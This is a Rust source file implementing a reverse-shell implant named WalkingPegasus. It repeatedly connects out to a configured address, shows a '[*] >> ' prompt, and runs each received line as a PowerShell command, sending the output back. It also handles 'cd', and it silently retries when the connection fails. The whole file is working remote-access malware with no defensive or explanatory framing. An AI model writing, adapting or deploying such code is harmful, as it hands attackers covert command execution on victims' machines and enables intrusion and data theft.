#![allow(unused_imports, unused_variables, unused_mut)]

use std::env;
use std::net::TcpStream;
use std::io::{self, Read, Write};
use std::process::Command;


pub struct WalkingPegasus {
    pub addr: String
}

impl WalkingPegasus {
    //      +=======+ FUNCTIONS +=======+      // 
    fn do_something(&self, command: String, s: &mut TcpStream) {
        if command == "hello\n"
        {
            s.write_all(b"Hello\n").expect("");
    
        }
        else if command.starts_with("cd ") 
        {
            let path = command.trim_start_matches("cd ").trim().to_owned();
    
            if let Err(_) = env::set_current_dir(&path) {
                s.write(b"Cant chnage it bro\n").expect("");
            } 
            else { }
            
        }
        else 
        {
            let output = Command::new("powershell").arg(command).output().expect("");
            // println!("{:?}", output);
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                s.write(stdout.as_bytes()).expect("");
            }
            else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                s.write(stderr.as_bytes()).expect("");
            }
        }
    }

    pub fn connect(&self) {
        loop {
            match TcpStream::connect(self.addr.clone()) { 
                Ok(mut stream) => {
                    loop 
                    {
                        stream.write(b"[*] >> ").expect("");
                        let mut data = [0 as u8; 1024];
    
                        if let Ok(size) = stream.read(&mut data)
                        {
                            let rec_data = &data[..size];
                            let msg = String::from_utf8_lossy(rec_data).to_string();
                            // HANDLE CLIENT
                            self.do_something(msg, &mut stream);
                        }
                        else { break; }
                    }
                }
                Err(ref e) if e.kind() == io::ErrorKind::ConnectionRefused => { }
                Err(_) => { }
            }
        }
    }
}